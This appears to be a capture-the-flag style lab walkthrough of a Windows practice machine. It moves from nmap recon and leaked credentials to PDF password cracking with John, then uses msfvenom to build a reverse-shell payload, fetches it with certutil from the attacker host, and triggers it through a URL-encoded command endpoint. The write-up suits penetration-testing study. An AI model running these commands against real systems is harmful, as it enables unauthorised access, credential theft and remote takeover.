# Starting off with Nmap scan:
`nmap -A [ip]`

Found Microsoft HTTPAPI/2.0

![aef86baa9d7354a521f604b96d71912a.png](../../../../_resources/aef86baa9d7354a521f604b96d71912a.png)

Visit port 8089 in browser:

![79538b38fd511a42c652f5b773339c35.png](../../../../_resources/79538b38fd511a42c652f5b773339c35.png)

Click on the buttons:

![745fc3b6a2358959655c84313d13eb0c.png](../../../../_resources/745fc3b6a2358959655c84313d13eb0c.png)

Redirected to another IP at port 333333

# Try to curl port 33333 on the target:

![c0956f60be12ee4397164e10d6c6d4c3.png](../../../../_resources/c0956f60be12ee4397164e10d6c6d4c3.png)

Notice  that curling list-running-procs on port 33333 on target returns 'Cannot "GET"' message

Trying POST

Looked up how to send a post request using curl and found:

`curl -X POST http://192.168.144.99:33333/list-running-procs`

![7f45572eaedce9721f52c26c3118f63d.png](../../../../_resources/7f45572eaedce9721f52c26c3118f63d.png)

Looks like it's missing a content length. I looked up how to add one using curl:

Using `curl -d ""` allows to specify content length in the request:

Tried this:

`curl -d "1" -X POST http://192.168.144.99:33333/list-running-procs`

![ab548ccb95ecc795668843553ca3d49b.png](../../../../_resources/ab548ccb95ecc795668843553ca3d49b.png)

Awesome, got the system process list. Found an interesting one that has what appears to be a user name and password from a cmd session:

![159b5825dc71568f4990827e127e41d7.png](../../../../_resources/159b5825dc71568f4990827e127e41d7.png)

username: ariah
pass: Tm93aXNlU2xvb3BUaGVvcnkxMzkK

The password seems to be encrypted or encoded. I tried the simple base 64 decode in Kali, and it worked to show what seems like a password:

![accbec68d5b9a34959013c116f3f7202.png](../../../../_resources/accbec68d5b9a34959013c116f3f7202.png)

user: ariah
password: NowiseSloopTheory139

Tried to login using ftp with the newly discovered creds:

![9f12aecd222c17631b53be7a442ffbf7.png](../../../../_resources/9f12aecd222c17631b53be7a442ffbf7.png)

Checked for any files:

![7ff4c894100deae2a1d1837268ac3087.png](../../../../_resources/7ff4c894100deae2a1d1837268ac3087.png)

Found Infrastructure.pdf

Downloaded Infrastructure.pdf:

![1b6aa781fb3a570f92b28d13b628a112.png](../../../../_resources/1b6aa781fb3a570f92b28d13b628a112.png)

Tried to open it, but it's password protected. Tried the password for ariah, but that did not work:

![28dc628bca5f4a5ca2cc5625e5890a65.png](../../../../_resources/28dc628bca5f4a5ca2cc5625e5890a65.png)

# Using John to get it. Use pdf2john.pl:

`/usr/share/john/pdf2john.pl Infrastructure.pdf > InfraPDFhash`

![8cf8570f7d2b56db0d2596fac36cfac9.png](../../../../_resources/8cf8570f7d2b56db0d2596fac36cfac9.png)

Didn't work properly. Since the above screenshot said the pdf file may not have been transferred properly, I decide to try to login using ssh:

`ssh ariah@192.168.144.99`

![5bb96d766f48cd0c9b04cb52cbec78fe.png](../../../../_resources/5bb96d766f48cd0c9b04cb52cbec78fe.png)

Okay, there we go. I'm now on the machine. Let's browse for files:

Found the local.txt in the Desktop:

![8bc989085e9389a370b5d945fe20680e.png](../../../../_resources/8bc989085e9389a370b5d945fe20680e.png)

Found ftp directory on the c drive. Maybe I can get that pdf from here instead:

![8269dd9a3ac2d2b1ac6dd70977d5311a.png](../../../../_resources/8269dd9a3ac2d2b1ac6dd70977d5311a.png)

# Decide to use scp to get the file:

`scp ariah@192.168.144.99:C:/ftp/Infrastructure.pdf .`

![5bb094f2a73523d2aafd8a833cd8ec23.png](../../../../_resources/5bb094f2a73523d2aafd8a833cd8ec23.png)

# Trying John again:

![adf76c70cf2071a0848ae646d145424b.png](../../../../_resources/adf76c70cf2071a0848ae646d145424b.png)

Seems to have worked this time:

![3219cb120d26317fc69f7f6c165d8e25.png](../../../../_resources/3219cb120d26317fc69f7f6c165d8e25.png)

Running John to try and crack the pdf:

![9693cecea6d2afed1e805e5e4e118fa1.png](../../../../_resources/9693cecea6d2afed1e805e5e4e118fa1.png)

Updated John command to specify rockyou.txt:

![267b42927d93021b1213c9ff1c7e7858.png](../../../../_resources/267b42927d93021b1213c9ff1c7e7858.png)

pdf pass: ariah4168

Finally unlocked the pdf:

![67c815ebfc6ef4d6e7d9ab50256b9e3a.png](../../../../_resources/67c815ebfc6ef4d6e7d9ab50256b9e3a.png)

# Ran netstat on the machine logged in as ariah to check ports that these servers could be running on:

![60b5d8ff94c35b28b4314ead0e00ee65.png](../../../../_resources/60b5d8ff94c35b28b4314ead0e00ee65.png)

Some ports that didn't show up in the nmap scan. Interesting.

Checking the http://nickel/? command endpoint on the system:

`curl http://nickel/?whoami`

![3626e36afcfc049415fd1b21e4a6d7b0.png](../../../../_resources/3626e36afcfc049415fd1b21e4a6d7b0.png)

# Construct a reverse shell to be executed on the temporary command endpoint:

- Using msfvenom to create the shell.exe (since this is a windows machine)

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.144 LPORT=4444 -f exe > shell.exe`

dissecting the command:
-p = payload 
LHOST = my attack machine IP (the one for tun0 for the VPN I'm on)
LPORT = local attack machine port to listen on
-f = file type for the payload shell
-> = write to a file

![3c04b8485a81a0d878aaed61af193f3a.png](../../../../_resources/3c04b8485a81a0d878aaed61af193f3a.png)

- Start webserver from directory where shell lives now:

`python3 -m http.server 80`

![3a761fd63f9813fd3a08ee620d4ea782.png](../../../../_resources/3a761fd63f9813fd3a08ee620d4ea782.png)

- Use certutil to get the shell.exe from the attacker machine onto the target:

`certutil.exe -urlcache -f http://192.168.49.144/shell.exe shell.exe`

![999fec0e54012894f4996be983f3551f.png](../../../../_resources/999fec0e54012894f4996be983f3551f.png)

![66cb9b3e7f3d2b306bba3d3ddb912028.png](../../../../_resources/66cb9b3e7f3d2b306bba3d3ddb912028.png)

- Kill python server on attack machine and start netcat listener on port specified in payload:

`nc -nlvp 4444`

![4ce2d1fd8389ebdec93f41d8b6a668aa.png](../../../../_resources/4ce2d1fd8389ebdec93f41d8b6a668aa.png)

Make sure we can use curl to find the file on victim machine when going through command endpoint before trying to execute the shell.exe:

`curl http://nickel/?'cmd /c dir C:\Users\ariah'`

![63f0efb6253284fa65675de0a64997ee.png](../../../../_resources/63f0efb6253284fa65675de0a64997ee.png)

malformed url typically means the string needs to be url encoded
I'm trying to use https://www.urlencoder.org/

cmd /c dir C:\Users\ariah becomes cmd%20%2Fc%20dir%20C%3A%5CUsers%5Cariah

Using this in place of the desired command in the URL on the target like so:

`curl http://nickel/?cmd%20%2Fc%20dir%20C%3A%5CUsers%5Cariah`

produces the following:

![6e1f7e7d9cbcdc83d81b05d98314ed71.png](../../../../_resources/6e1f7e7d9cbcdc83d81b05d98314ed71.png)

Okay, now that the URL is formed properly, I should be able to execute the shell:

Running cmd /c C:\Users\ariah\shell.exe would normally do it. So I just need to URL encode this command like I did the previous one:

![e0fa4ffeaa383fcf662fad2081d024cb.png](../../../../_resources/e0fa4ffeaa383fcf662fad2081d024cb.png)

The full command should be:

`curl http://nickel/?cmd%20%2Fc%20C%3A%5CUsers%5Cariah%5Cshell.exe`

This was not working for whatever reason with the port 4444 and the payload I specified earlier so I instead created a new one and used port 80 with netcat to listen. This is the command used to generate the new payload:

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.144 LPORT=80 -f exe > f.exe`

![5a59b8cef219c538cab62266ae6c1ccb.png](../../../../_resources/5a59b8cef219c538cab62266ae6c1ccb.png)

I then uploaded this to the target as g.exe using this command:

`certutil.exe -urlcache -f http://192.168.49.144/f.exe g.exe`

![eed150ada09d918794f0bb97eadb1630.png](../../../../_resources/eed150ada09d918794f0bb97eadb1630.png)

Started my netcat listener on port 80:

`nc -nlvp 80`

![3d306919d08bdec857715cea7f447b5d.png](../../../../_resources/3d306919d08bdec857715cea7f447b5d.png)

Encoding the appropriate command for the URL:

![ce9902e01d02ed69014c925d5cc715e4.png](../../../../_resources/ce9902e01d02ed69014c925d5cc715e4.png)

Ran the command on the target to execute the g.exe:

`curl http://nickel/?cmd%20%2Fc%20C%3A%5CUsers%5Cariah%5Cg.exe`

![42fb72a37428a4635c75c6dc00652c07.png](../../../../_resources/42fb72a37428a4635c75c6dc00652c07.png)

And watched the shell come to my netcat listener:

![b3b3b0ba8d0d5c62cc7c9866c6b6b3b9.png](../../../../_resources/b3b3b0ba8d0d5c62cc7c9866c6b6b3b9.png)

Found the proof.txt in Administrator Desktop:

![d447719434575be0d5afac23fbc7c217.png](../../../../_resources/d447719434575be0d5afac23fbc7c217.png)

